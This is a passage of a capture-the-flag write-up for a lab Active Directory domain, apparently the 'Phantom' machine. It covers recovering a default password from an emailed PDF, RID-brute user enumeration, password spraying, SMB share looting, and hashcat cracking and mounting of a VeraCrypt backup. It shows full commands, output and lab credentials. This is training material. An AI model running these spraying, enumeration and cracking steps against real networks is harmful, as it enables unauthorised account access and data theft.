L1MvU3RhbmRhcmQKL1AgNCAwIFIKL1BnIDEgMCBSCi9BIDw8L08vTGF5b3V0L1BsYWNlbWVudC9C  
bG9jawo+PgovS1s1IF0KPj4KZW5kb2JqCgoxMSAwIG9iago8PC9UeXBlL1N0cnVjdEVsZW0KL1Mv  
U3RhbmRhcmQKL1AgNCAwIFIKL1BnIDEgMCBSCi9BIDw8L08vTGF5b3V0L1BsYWNlbWVudC9CbG9j  
awo+PgovS1s2IDcgXQo+PgplbmRvYmoKCjEyIDAgb2JqCjw8L1R5cGUvU3RydWN0RWxlbQovUy9T  
dGFuZGFyZAovUCA0IDAgUgovUGcgMSAwIFIKL0EgPDwvTy9MYXlvdXQvUGxhY2VtZW50L0Jsb2Nr  
Cj4+Ci9LWzggOSBdCj4+CmVuZG9iagoKMTMgMCBvYmoKPDwvVHlwZS9TdHJ1Y3RFbGVtCi9TL1N0  
YW5kYXJkCi9QIDQgMCBSCi9QZyAxIDAgUgovQSA8PC9PL0xheW91dC9QbGFjZW1lbnQvQmxvY2sK  
Pj4KL0tbMTAgXQo+PgplbmRvYmoKCjE0IDAgb2JqCjw8L1R5cGUvU3RydWN0RWxlbQovUy9TdGFu  
ZGFyZAovUCA0IDAgUgovUGcgMSAwIFIKL0EgPDwvTy9MYXlvdXQvUGxhY2VtZW50L0Jsb2NrCj4+  
Ci9LWzExIF0KPj4KZW5kb2JqCgo0IDAgb2JqCjw8L1R5cGUvU3RydWN0RWxlbQovUy9Eb2N1bWVu  
dAovUCAyMyAwIFIKL1BnIDEgMCBSCi9LWzUgMCBSICA2IDAgUiAgNyAwIFIgIDggMCBSICA5IDAg  
UiAgMTAgMCBSICAxMSAwIFIgIDEyIDAgUiAgMTMgMCBSICAxNCAwIFIgIF0KPj4KZW5kb2JqCgoy  
MyAwIG9iago8PC9UeXBlL1N0cnVjdFRyZWVSb290Ci9QYXJlbnRUcmVlIDI0IDAgUgovUm9sZU1h  
cDw8L1N0YW5kYXJkL1AKPj4KL0tbNCAwIFIgIF0KPj4KZW5kb2JqCgoyNCAwIG9iago8PC9OdW1z  
WwowIFsgNSAwIFIgNiAwIFIgNyAwIFIgOCAwIFIgOSAwIFIgMTAgMCBSIDExIDAgUiAxMSAwIFIg  
MTIgMCBSIDEyIDAgUgoxMyAwIFIgMTQgMCBSIF0KXT4+CmVuZG9iagoKMTUgMCBvYmoKPDwvVHlw  
ZS9QYWdlcwovUmVzb3VyY2VzIDIyIDAgUgovS2lkc1sgMSAwIFIgXQovQ291bnQgMT4+CmVuZG9i  
agoKMjUgMCBvYmoKPDwvVHlwZS9DYXRhbG9nL1BhZ2VzIDE1IDAgUgovUGFnZU1vZGUvVXNlT3V0  
bGluZXMKL09wZW5BY3Rpb25bMSAwIFIgL1hZWiBudWxsIG51bGwgMF0KL1N0cnVjdFRyZWVSb290  
IDIzIDAgUgovTGFuZyhlbi1VUykKL01hcmtJbmZvPDwvTWFya2VkIHRydWU+Pgo+PgplbmRvYmoK  
CjI2IDAgb2JqCjw8L0NyZWF0b3I8RkVGRjAwNTcwMDcyMDA2OTAwNzQwMDY1MDA3Mj4KL1Byb2R1  
Y2VyPEZFRkYwMDRDMDA2OTAwNjIwMDcyMDA2NTAwNEYwMDY2MDA2NjAwNjkwMDYzMDA2NTAwMjAw  
MDMyMDAzNDAwMkUwMDMyPgovQ3JlYXRpb25EYXRlKEQ6MjAyNDA3MDYxMTUzMDYrMDInMDAnKT4+  
CmVuZG9iagoKeHJlZgowIDI3CjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAwNzQwMCAwMDAwMCBu  
IAowMDAwMDAwMDE5IDAwMDAwIG4gCjAwMDAwMDA3MDcgMDAwMDAgbiAKMDAwMDAwODYyNyAwMDAw  
MCBuIAowMDAwMDA3NTE2IDAwMDAwIG4gCjAwMDAwMDc2MjYgMDAwMDAgbiAKMDAwMDAwNzczNiAw  
MDAwMCBuIAowMDAwMDA3ODQ2IDAwMDAwIG4gCjAwMDAwMDc5NTYgMDAwMDAgbiAKMDAwMDAwODA2  
NiAwMDAwMCBuIAowMDAwMDA4MTc3IDAwMDAwIG4gCjAwMDAwMDgyOTAgMDAwMDAgbiAKMDAwMDAw  
ODQwMyAwMDAwMCBuIAowMDAwMDA4NTE1IDAwMDAwIG4gCjAwMDAwMDg5OTEgMDAwMDAgbiAKMDAw  
MDAwMDcyNyAwMDAwMCBuIAowMDAwMDA2MjI2IDAwMDAwIG4gCjAwMDAwMDYyNDggMDAwMDAgbiAK  
MDAwMDAwNjQ0NyAwMDAwMCBuIAowMDAwMDA2OTU3IDAwMDAwIG4gCjAwMDAwMDczMTEgMDAwMDAg  
biAKMDAwMDAwNzM0NCAwMDAwMCBuIAowMDAwMDA4Nzc3IDAwMDAwIG4gCjAwMDAwMDg4NzYgMDAw  
MDAgbiAKMDAwMDAwOTA2NiAwMDAwMCBuIAowMDAwMDA5MjM1IDAwMDAwIG4gCnRyYWlsZXIKPDwv  
U2l6ZSAyNy9Sb290IDI1IDAgUgovSW5mbyAyNiAwIFIKL0lEIFsgPEM0QUQ2NUU5NEZCOTk3OTYx  
MTU1Q0FGRkQ2QUMyQjUzPgo8QzRBRDY1RTk0RkI5OTc5NjExNTVDQUZGRDZBQzJCNTM+IF0KL0Rv  
Y0NoZWNrc3VtIC8wQTM4N0RBQjYxNTBCMkRCMTg0MzJGMDJENzY2MDQxMwo+PgpzdGFydHhyZWYK  
OTQxNAolJUVPRgo=  
  
--===============6932979162079994354==--
```

`Content-Type: application/pdf  
`MIME-Version: 1.0 Content-Transfer-Encoding: base64`

It seems we have a base64 encoded email, but `echo "the encoded email" |base64 -d` makes my shell crash since the email is too long.

We extract the pdf, then make it readable :

```bash
pdftotext welcome_template.pdf - | less
```

```bash
Welcome to Phantom!  
Dear <NAME>  
We are excited to have you on board.  
Below are your user credentials:  
Username: <USERNAME>  
Password: Ph4nt0m@5t4rt!  
Please log in to your account using these credentials. For security reasons, we strongly  
recommend that you change your password immediately after your first login.  
If you have any questions or need assistance, feel free to reach out to our support team at  
techsupport@phantom.vl  
Best regards,  
The Phantom Team  
  
^L  
(END)
```

And we got the base password for the entreprise : `Ph4nt0m@5t4rt!`.

Now, we look for users as guest :

```bash
>  nxc smb 10.129.234.63 -u guest -p '' --rid-brute 2>/dev/null
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.63   445    DC               [+] phantom.vl\guest: 
SMB         10.129.234.63   445    DC               498: PHANTOM\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               500: PHANTOM\Administrator (SidTypeUser)
SMB         10.129.234.63   445    DC               501: PHANTOM\Guest (SidTypeUser)
SMB         10.129.234.63   445    DC               502: PHANTOM\krbtgt (SidTypeUser)
SMB         10.129.234.63   445    DC               512: PHANTOM\Domain Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               513: PHANTOM\Domain Users (SidTypeGroup)
SMB         10.129.234.63   445    DC               514: PHANTOM\Domain Guests (SidTypeGroup)
SMB         10.129.234.63   445    DC               515: PHANTOM\Domain Computers (SidTypeGroup)
SMB         10.129.234.63   445    DC               516: PHANTOM\Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               517: PHANTOM\Cert Publishers (SidTypeAlias)
SMB         10.129.234.63   445    DC               518: PHANTOM\Schema Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               519: PHANTOM\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               520: PHANTOM\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.63   445    DC               521: PHANTOM\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               522: PHANTOM\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               525: PHANTOM\Protected Users (SidTypeGroup)
SMB         10.129.234.63   445    DC               526: PHANTOM\Key Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               527: PHANTOM\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               553: PHANTOM\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.63   445    DC               571: PHANTOM\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.63   445    DC               572: PHANTOM\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.63   445    DC               1000: PHANTOM\DC$ (SidTypeUser)
SMB         10.129.234.63   445    DC               1101: PHANTOM\DnsAdmins (SidTypeAlias)
SMB         10.129.234.63   445    DC               1102: PHANTOM\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.63   445    DC               1103: PHANTOM\svc_sspr (SidTypeUser)
SMB         10.129.234.63   445    DC               1104: PHANTOM\TechSupports (SidTypeGroup)
SMB         10.129.234.63   445    DC               1105: PHANTOM\Server Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               1106: PHANTOM\ICT Security (SidTypeGroup)
SMB         10.129.234.63   445    DC               1107: PHANTOM\DevOps (SidTypeGroup)
SMB         10.129.234.63   445    DC               1108: PHANTOM\Accountants (SidTypeGroup)
SMB         10.129.234.63   445    DC               1109: PHANTOM\FinManagers (SidTypeGroup)
SMB         10.129.234.63   445    DC               1110: PHANTOM\EmployeeRelations (SidTypeGroup)
SMB         10.129.234.63   445    DC               1111: PHANTOM\HRManagers (SidTypeGroup)
SMB         10.129.234.63   445    DC               1112: PHANTOM\rnichols (SidTypeUser)
SMB         10.129.234.63   445    DC               1113: PHANTOM\pharrison (SidTypeUser)
SMB         10.129.234.63   445    DC               1114: PHANTOM\wsilva (SidTypeUser)
SMB         10.129.234.63   445    DC               1115: PHANTOM\elynch (SidTypeUser)
SMB         10.129.234.63   445    DC               1116: PHANTOM\nhamilton (SidTypeUser)
SMB         10.129.234.63   445    DC               1117: PHANTOM\lstanley (SidTypeUser)
SMB         10.129.234.63   445    DC               1118: PHANTOM\bbarnes (SidTypeUser)
SMB         10.129.234.63   445    DC               1119: PHANTOM\cjones (SidTypeUser)
SMB         10.129.234.63   445    DC               1120: PHANTOM\agarcia (SidTypeUser)
SMB         10.129.234.63   445    DC               1121: PHANTOM\ppayne (SidTypeUser)
SMB         10.129.234.63   445    DC               1122: PHANTOM\ibryant (SidTypeUser)
SMB         10.129.234.63   445    DC               1123: PHANTOM\ssteward (SidTypeUser)
SMB         10.129.234.63   445    DC               1124: PHANTOM\wstewart (SidTypeUser)
SMB         10.129.234.63   445    DC               1125: PHANTOM\vhoward (SidTypeUser)
SMB         10.129.234.63   445    DC               1126: PHANTOM\crose (SidTypeUser)
SMB         10.129.234.63   445    DC               1127: PHANTOM\twright (SidTypeUser)
SMB         10.129.234.63   445    DC               1128: PHANTOM\fhanson (SidTypeUser)
SMB         10.129.234.63   445    DC               1129: PHANTOM\cferguson (SidTypeUser)
SMB         10.129.234.63   445    DC               1130: PHANTOM\alucas (SidTypeUser)
SMB         10.129.234.63   445    DC               1131: PHANTOM\ebryant (SidTypeUser)
SMB         10.129.234.63   445    DC               1132: PHANTOM\vlynch (SidTypeUser)
SMB         10.129.234.63   445    DC               1133: PHANTOM\ghall (SidTypeUser)
SMB         10.129.234.63   445    DC               1134: PHANTOM\ssimpson (SidTypeUser)
SMB         10.129.234.63   445    DC               1135: PHANTOM\ccooper (SidTypeUser)
SMB         10.129.234.63   445    DC               1136: PHANTOM\vcunningham (SidTypeUser)
SMB         10.129.234.63   445    DC               1137: PHANTOM\SSPR Service (SidTypeGroup)
```

We got a big list of users, so we'll save it :
`>  nxc smb 10.129.234.63 -u guest -p '' --rid-brute 2>/dev/null | grep rid.txt

Now, we'll exclude everything but the users and `'{print $2}'` :

```bash
>  grep SidTypeUser rid.txt | grep -vE 'DC\$|krbtgt|Administrator|Guest' | awk -F '\\' '{print $2}' | sort -u > users.txt
```

That leaves us with :

```bash
>  cat users.txt  
agarcia (SidTypeUser)  
alucas (SidTypeUser)  
bbarnes (SidTypeUser)  
ccooper (SidTypeUser)  
cferguson (SidTypeUser)  
cjones (SidTypeUser)  
crose (SidTypeUser)  
ebryant (SidTypeUser)  
elynch (SidTypeUser)  
fhanson (SidTypeUser)  
ghall (SidTypeUser)  
ibryant (SidTypeUser)  
lstanley (SidTypeUser)  
nhamilton (SidTypeUser)  
pharrison (SidTypeUser)  
ppayne (SidTypeUser)  
rnichols (SidTypeUser)  
ssimpson (SidTypeUser)  
ssteward (SidTypeUser)  
svc_sspr (SidTypeUser)  
twright (SidTypeUser)  
vcunningham (SidTypeUser)  
vhoward (SidTypeUser)  
vlynch (SidTypeUser)  
wsilva (SidTypeUser)  
wstewart (SidTypeUser)
```

So we `'{print $1}'` to only keep the usernames :

```bash
>  awk '{print $1}' users.txt | sort -u > pusers.txt  
>  cat pusers.txt  
agarcia  
alucas  
bbarnes  
ccooper  
cferguson  
cjones  
crose  
ebryant  
elynch  
fhanson  
ghall  
ibryant  
lstanley  
nhamilton  
pharrison  
ppayne  
rnichols  
ssimpson  
ssteward  
svc_sspr  
twright  
vcunningham  
vhoward  
vlynch  
wsilva  
wstewart
```

We now got a clean user list. We won't anarchize them since we dn't have full names, only initials and last names.

Now, we passwordspray with the default Phantom password :

```bash
>  nxc smb 10.129.234.63 -u pusers.txt -p 'Ph4nt0m@5t4rt!' --continue-on-success  
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.63   445    DC               [-] phantom.vl\agarcia:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\alucas:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\bbarnes:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\ccooper:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\cferguson:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\cjones:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\crose:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\ebryant:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\elynch:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\fhanson:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\ghall:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt!    
SMB         10.129.234.63   445    DC               [-] phantom.vl\lstanley:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\nhamilton:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\pharrison:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\ppayne:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\rnichols:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\ssimpson:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\ssteward:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\svc_sspr:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\twright:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\vcunningham:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\vhoward:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\vlynch:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\wsilva:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\wstewart:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
```

And we got our first victim : `[+] phantom.vl\ibryant:Ph4nt0m@5t4rt!`

```bash
>  nxc smb 10.129.234.63 -u ibryant -p 'Ph4nt0m@5t4rt!' --shares  
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt!    
SMB         10.129.234.63   445    DC               [*] Enumerated shares  
SMB         10.129.234.63   445    DC               Share           Permissions     Remark  
SMB         10.129.234.63   445    DC               -----           -----------     ------  
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin  
SMB         10.129.234.63   445    DC               C$                              Default share  
SMB         10.129.234.63   445    DC               Departments Share READ               
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC  
SMB         10.129.234.63   445    DC               NETLOGON        READ            Logon server share    
SMB         10.129.234.63   445    DC               Public          READ               
SMB         10.129.234.63   445    DC               SYSVOL          READ            Logon server share
```

Se we can read `Departments Share`, `NETLOGON` and `SYSVOL`.

```bash
>  smbclient //10.129.234.63/"Departments Share" -U ibryant%Ph4nt0m@5t4rt!  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Sat Jul  6 18:25:31 2024  
 ..                                DHS        0  Thu Aug 14 13:55:49 2025  
 Finance                             D        0  Sat Jul  6 18:25:11 2024  
 HR                                  D        0  Sat Jul  6 18:21:31 2024  
 IT                                  D        0  Thu Jul 11 16:59:02 2024  
  
               6127103 blocks of size 4096. 2386345 blocks available  
smb: \> cd IT  
smb: \IT\> ls  
 .                                   D        0  Thu Jul 11 16:59:02 2024  
 ..                                  D        0  Sat Jul  6 18:25:31 2024  
 Backup                              D        0  Sat Jul  6 20:04:34 2024  
 mRemoteNG-Installer-1.76.20.24615.msi      A 43593728  Sat Jul  6 18:14:26 2024  
 TeamViewerQS_x64.exe                A 32498992  Sat Jul  6 18:26:59 2024  
 TeamViewer_Setup_x64.exe            A 80383920  Sat Jul  6 18:27:15 2024  
 veracrypt-1.26.7-Ubuntu-22.04-amd64.deb      A  9201076  Sun Oct  1 22:30:37 2023  
 Wireshark-4.2.5-x64.exe             A 86489296  Sat Jul  6 18:14:08 2024  
  
               6127103 blocks of size 4096. 2386345 blocks available  
smb: \IT\> cd Backup  
smb: \IT\Backup\> ls  
 .                                   D        0  Sat Jul  6 20:04:34 2024  
 ..                                  D        0  Thu Jul 11 16:59:02 2024  
 IT_BACKUP_201123.hc                 A 12582912  Sat Jul  6 20:04:14 2024  
  
               6127103 blocks of size 4096. 2386345 blocks available  
smb: \IT\Backup\> get IT_BACKUP_201123.hc  
getting file \IT\Backup\IT_BACKUP_201123.hc of size 12582912 as IT_BACKUP_201123.hc (617.6 KiloBytes/sec) (average 617.6 KiloBytes/sec)  
smb: \IT\Backup\> cd /HR
smb: \HR\> ls  
 .                                   D        0  Sat Jul  6 18:21:31 2024  
 ..                                  D        0  Sat Jul  6 18:25:31 2024  
 Employee-Emergency-Contact-Form.pdf      A    21861  Sat Jul  6 18:21:31 2024  
 EmployeeHandbook.pdf                A   296436  Sat Jul  6 18:16:25 2024  
 Health_Safety_Information.pdf       A  3940231  Sat Jul  6 18:20:39 2024  
 NDA_Template.pdf                    A    18790  Sat Jul  6 18:17:33 2024  
  
               6127103 blocks of size 4096. 2386345 blocks available  
smb: \HR\> cd /Finance  
smb: \Finance\> ls  
 .                                   D        0  Sat Jul  6 18:25:11 2024  
 ..                                  D        0  Sat Jul  6 18:25:31 2024  
 Expense_Reports.pdf                 A   709718  Sat Jul  6 18:25:11 2024  
 Invoice-Template.pdf                A   190135  Sat Jul  6 18:23:54 2024  
 TaxForm.pdf                         A   160747  Sat Jul  6 18:22:58 2024  
  
               6127103 blocks of size 4096. 2386329 blocks available
```

We got a bunch of PDFs, `IT_BACKUP_201123.hc` looked interesting so I got it, I'll leave the pdfs for now.

```bash
>  smbclient //10.129.234.63/NETLOGON -U ibryant%Ph4nt0m@5t4rt!  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Thu Jul  4 15:14:48 2024  
 ..                                  D        0  Thu Jul  4 15:16:13 2024  
  
               6127103 blocks of size 4096. 2386233 blocks available  
smb: \> exit  
>  smbclient //10.129.234.63/SYSVOL -U ibryant%Ph4nt0m@5t4rt!  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Thu Jul  4 15:14:48 2024  
 ..                                  D        0  Thu Jul  4 15:14:48 2024  
 phantom.vl                         Dr        0  Thu Jul  4 15:14:48 2024  
  
               6127103 blocks of size 4096. 2386233 blocks available  
smb: \> cd phantom.vl  
smb: \phantom.vl\> ls  
 .                                   D        0  Thu Jul  4 15:16:13 2024  
 ..                                  D        0  Thu Jul  4 15:14:48 2024  
 DfsrPrivate                      DHSr        0  Thu Jul  4 15:16:13 2024  
 Policies                            D        0  Thu Jul  4 15:14:55 2024  
 scripts                             D        0  Thu Jul  4 15:14:48 2024  
  
               6127103 blocks of size 4096. 2386233 blocks available  
smb: \phantom.vl\> cd DfsrPrivate  
cd \phantom.vl\DfsrPrivate\: NT_STATUS_ACCESS_DENIED
```

Looks like there is an interesting dir in `SYSVOL` but we can't access it as ibryant.

```bash
>  file IT_BACKUP_201123.hc  
  
IT_BACKUP_201123.hc: data
```

The .hc tells us this is `VeraCrypt`. `"Should you need to crack a hash, use a short custom wordlist based on company name and simple mutation rules commonly seen in real life passwords (e.g. year and a special character)."` as the sole information for the box comes to mind.

We build a tiny wordlist and add rules with years and special characters, with different capitalization modes for `phantom` `: for phantom ; c for Phantom ; u for PHANTOM`
Adding `l (lowercase)` would be useless as `: (no change)` already takes `phantom`.

```bash
>  nano /tmp/pbase.txt  
>  cat /tmp/pbase.txt  
phantom  
Phantom  
PHANTOM
>  nano /tmp/p.rules  
>  cat /tmp/p.rules  
:  
c  
u  
$2$0$2$3$!  
$2$0$2$4$!  
$2$0$2$5$!  
c $2$0$2$3$!  
c $2$0$2$4$!  
c $2$0$2$5$!  
u $2$0$2$3$!  
u $2$0$2$4$!  
u $2$0$2$5$!  
$2$0$2$3$@  
$2$0$2$4$@  
$2$0$2$5$@
```

So we got a small range from 2023 to 2025 with ! or @, we'll add more special characters first if necessary like `!` or `+` or `&`.

Since it's a `.hc` file, we'll either use `13711, 13721 or 13731` to decrypt it with `hashcat` although the most common is `13721` which is `SHA-512` so we'll try this first :

```bash
>  hashcat -m 13721 IT_BACKUP_201123.hc /tmp/pbase.txt -r /tmp/p.rules  
hashcat (v7.1.2) starting  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 128  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 15  
  
Optimizers applied:  
* Zero-Byte  
* Single-Hash  
* Single-Salt  
* Slow-Hash-SIMD-LOOP  
* Uses-64-Bit  
  
ATTENTION! Potfile storage is disabled for this hash mode.  
Passwords cracked during this session will NOT be stored to the potfile.  
Consider using -o to save cracked passwords.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 512 MB (12335 MB free)  
  
Dictionary cache built:  
* Filename..: /tmp/pbase.txt  
* Passwords.: 3  
* Bytes.....: 24  
* Keyspace..: 45  
* Runtime...: 0 secs  
  
The wordlist or mask that you are using is too small.  
This means that hashcat cannot use the full parallel power of your device(s).  
Hashcat is expecting at least 95 base words but only got 3.2% of that.  
Unless you supply more work, your cracking speed will drop.  
For tips on supplying more work, see: https://hashcat.net/faq/morework  
  
Approaching final keyspace - workload adjusted.              
  
IT_BACKUP_201123.hc:Phantom2023!                             
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 13721 (VeraCrypt SHA512 + XTS 512 bit (legacy))  
Hash.Target......: IT_BACKUP_201123.hc  
Time.Started.....: Mon Jun  1 23:19:28 2026 (11 secs)  
Time.Estimated...: Mon Jun  1 23:19:39 2026 (0 secs)  
Kernel.Feature...: Pure Kernel (password length 0-128 bytes)  
Guess.Base.......: File (/tmp/pbase.txt)  
Guess.Mod........: Rules (/tmp/p.rules)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:        1 H/s (1.15ms) @ Accel:95 Loops:500 Thr:1 Vec:4  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 12/45 (26.67%)  
Rejected.........: 0/12 (0.00%)  
Restore.Point....: 0/3 (0.00%)  
Restore.Sub.#01..: Salt:0 Amplifier:3-4 Iteration:499500-499999  
Candidate.Engine.: Device Generator  
Candidates.#01...: phantom2023! -> PHANTOM2023!  
Hardware.Mon.#01.: Temp: 71c Util: 15%  
  
Started: Mon Jun  1 23:18:28 2026  
Stopped: Mon Jun  1 23:19:41 2026
```

We're lucky it worked first try, `Phantom2023!` it is.

We then mount the Veracrypt backup and decrypt it with the password :

```bash
>  sudo veracrypt --text --mount IT_BACKUP_201123.hc /mnt/phantom --password='Phantom2023!' --pim=0 --keyfiles=''  
Protect hidden volume (if any)? (y=Yes/n=No) [No]: n  
Error: /dev/mapper/control: open failed: No such device  
Failure to communicate with kernel device-mapper driver.  
Check that device-mapper is available in the kernel.  
Incompatible libdevmapper 1.02.215 (2026-05-15) and kernel driver (unknown version).
```

```bash
>  uname -r  
pacman -Q linux  
ls /lib/modules/$(uname -r)/kernel/drivers/md/ 2>/dev/null || echo "No md/ directory"  
zgrep CONFIG_BLK_DEV_DM /proc/config.gz 2>/dev/null || echo "No config.gz"  
7.0.9-arch2-1  
linux 7.0.10.arch1-1  
No md/ directory  
CONFIG_BLK_DEV_DM_BUILTIN=y  
CONFIG_BLK_DEV_DM=m
```
We aren't so lucky with my kernel, I have to reboot my computer since my kernel is actually updated but runs on an older version for some reason.
I love ArchLinux.

I reboot, then I retry :

```bash
>  sudo veracrypt --text --mount IT_BACKUP_201123.hc /mnt/phantom --password='Phantom2023!' --pim=0 --keyfiles=''  
Protect hidden volume (if any)? (y=Yes/n=No) [No]: n

>  cd /mnt/phantom
>  ls  
'$RECYCLE.BIN'         azure_vms_1023.json   azure_vms_1123.json   splunk_logs_1102  'System Volume Information'    vyos_backup.tar.gz  
azure_vms_0805.json   azure_vms_1104.json   splunk_logs_1003      splunk_logs1203    ticketing_system_backup.zip
>  cd '$RECYCLE.BIN'  
>  ls  
desktop.ini  
>  cat desktop.ini  
[.ShellClassInfo]  
CLSID={645FF040-5081-101B-9F08-00AA002F954E}  
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-8964
>  cd /mnt/phantom/"System Volume Information"  
>  ls  
WPSettings.dat  
>  cat WPSettings.dat  
  
�[��    �Tm%                                                                                                                                                                                                        
>  mv /mnt/phantom/"System Volume Information"/WPSettings.dat /home/WPSettings.dat  
mv: cannot create regular file '/home/WPSettings.dat': Permission denied
```

Since we can't move the files, we'll create a mount directory on our machine and `copy` them :

```bash
>  mkdir -p ~/phantom-mount  
  
>  cd ~/phantom-mount
>  sudo cp /mnt/phantom/"System Volume Information"/WPSettings.dat ~/phantom-mount/
>  sudo cp /mnt/phantom/vyos_backup.tar.gz ~/phantom-mount/  
  
Please touch the FIDO authenticator.  

>  sudo chown -R "$USER:$USER" ~/phantom-mount 

>  ls  
vyos_backup.tar.gz  WPSettings.dat 
  
>  tar -tzf vyos_backup.tar.gz | head -20  
  
./  
bin  
config/  
config/archive/  
config/archive/config.boot.4.gz  
config/archive/config.boot.3.gz  
config/archive/config.boot.8.gz  
config/archive/config.boot.5.gz  
config/archive/config.boot.0.gz  
config/archive/config.boot.7.gz  
config/archive/config.boot  
config/archive/lr.conf  
config/archive/config.boot.6.gz  
config/archive/lr.state  
config/archive/commits  
config/archive/config.boot.1.gz  
config/archive/config.boot.2.gz  
config/support/  
config/vyos-activate.log  
config/.vyatta_config
```

Now, we'll extract the archive and try to grep some credentials :

```bash
>  sudo mkdir vyos && sudo tar -xzf vyos_backup.tar.gz -C vyos
>  cd ~/phantom-mount/vyos  
>  ls  
bin  config  etc  home  lib  lib64  media  mnt  opt  root  run  sbin  srv  tmp  var
>  grep -nE 'user|login|password|hash|secret|name|token|authentication|username' config/archive/config.boot | head -40  
52:        name CONN_FILTER {  
64:        name PHANTOM_MANAGEMENT {  
86:            password-protected  
93:            password-protected  
129:    host-name "vyos"  
130:    login {  
131:        user admin {  
132:            authentication {  
